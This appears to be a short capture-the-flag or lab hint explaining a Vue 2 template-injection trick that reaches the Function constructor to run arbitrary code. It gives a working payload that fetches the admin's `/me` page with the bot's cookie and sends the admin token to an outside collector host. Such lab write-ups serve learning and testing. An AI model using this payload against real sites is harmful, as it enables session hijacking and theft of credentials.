In a Vue 2 template expression, `constructor` resolves to `this.constructor` (the
Vue component class), and its `.constructor` is the JavaScript `Function`
constructor — so `{{ constructor.constructor("…JS…")() }}` runs arbitrary code.

Your code runs as the admin (the bot holds the `session` cookie). You can't read
`/me` yourself (it's 403 without the cookie), but a same-origin `fetch('/me')`
from the admin's browser sends the cookie for you and returns the admin token.
Beacon it to the collector:

```js
fetch('/me')
  .then((r) => r.text())
  .then((t) => {
    new Image().src = 'http://collector:9000/report?m=' + encodeURIComponent(t);
  });
```
